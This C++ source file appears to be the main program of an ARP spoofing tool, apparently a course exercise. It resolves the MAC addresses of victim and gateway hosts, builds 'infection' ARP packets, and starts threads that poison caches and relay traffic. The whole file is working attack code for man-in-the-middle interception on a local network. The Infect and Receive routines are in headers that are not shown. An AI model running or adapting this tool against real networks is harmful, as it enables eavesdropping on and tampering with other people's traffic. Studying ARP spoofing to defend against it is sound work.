#include <iostream>
#include <cstdio>
#include <pcap.h>
#include <map>
#include <vector>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
#include "getMacaddr.h"
#include "getIPv4addr.h"
#include "etharppacket.h"
#include "setEthArpPacket.h"
#include "mac.h"
#include "ip.h"
#include "resolve_arp.h"
#include "flow.h"
#include "relatedspoof.h"

using namespace std;
// Sender는 보통 Victim이라고도 함
// Target은 일반적으로 gateway임
void usage()
{
	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[])
{
	if (argc < 4)
	{
		usage();
		return -1;
	}

	const char *dev = argv[1]; // store interface
	printf("--------------------------------\n");
	printf("--------------------------------\n");
	/*
		get attacker's mac addr and ip addr
	*/
	cout << "-------------ATTACKER INFO-------------" << endl;
	uint8_t attacker_mac_addr[MAC_LEN]; // will store attacker's mac addr
	uint32_t attacker_ip_addr;	// will store attacker's ip addr
	getMacaddr(dev, attacker_mac_addr); // save the attackers' mac addr in attacker_mac_addr
	Mac attacker_mac = Mac(attacker_mac_addr);
	cout << "ATTACKER MAC ADDRESS: " << std::string(attacker_mac) << endl;
	getIPv4addr(dev, &attacker_ip_addr); // save the attacker's ip addr in attacker_ip_addr
	Ip attacker_ip = Ip(attacker_ip_addr);
	cout << "ATTACKER IP ADDRESS: " << std::string(attacker_ip) << endl;
	//-------------------------------------------------------------------------------------------------------

	thread t[argc - 2];
	map<Ip, Mac> arp_table;	   // ip:mac
	vector<struct flow> flows; //<sender_ip,target_ip>
	// arp_table.insert({attacker_ip, attacker_mac});

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	// Mac resolve_arp(pcap_t* handle, Mac dmac, Mac smac, Ip sip, Mac tmac, Ip tip );

	for (int i = 2; i < argc; i += 2)
	{
		cout << "-------------SENDER INFO-------------" << endl;
		// find sender's mac addr
		Ip sender_ip = Ip(argv[i]);
		Mac sender_mac = resolve_arp(handle, Mac::broadcastMac(), attacker_mac, attacker_ip, Mac::nullMac(), sender_ip);
		cout << "SENDER IP ADDRESS: " << std::string(sender_ip) << endl;
		cout << "SENDER MAC ADDRESS: " << std::string(sender_mac) << endl;

		cout << "-------------TARGET INFO-------------" << endl;
		// find target's mac addr
		Ip target_ip = Ip(argv[i + 1]);
		Mac target_mac = resolve_arp(handle, Mac::broadcastMac(), attacker_mac, attacker_ip, Mac::nullMac(), target_ip);

		cout << "TARGET IP ADDRESS: " << std::string(target_ip) << endl;
		cout << "TARGET MAC ADDRESS: " << std::string(target_mac) << endl;

		// generate infection packet
		EthArpPacket infPacket;
		setEthArpPacket(&infPacket, sender_mac, attacker_mac, attacker_ip, sender_mac, sender_ip);
		cout << "-------------INFECTION PACKET IS READY-------------" << endl;
		struct flow tmp = {attacker_ip, attacker_mac, sender_ip, sender_mac, target_ip, target_mac, infPacket};
		flows.push_back(tmp);
		cout << "-------------A NEW FLOW IS ADDED-------------" << endl;
	}

	cout << "-------------SPOOFING START-------------" << endl;
	std::thread infect(Infect, handle, flows);
	std::thread receive(Receive, handle, flows);

	infect.join();
	receive.join();
	pcap_close(handle);
}
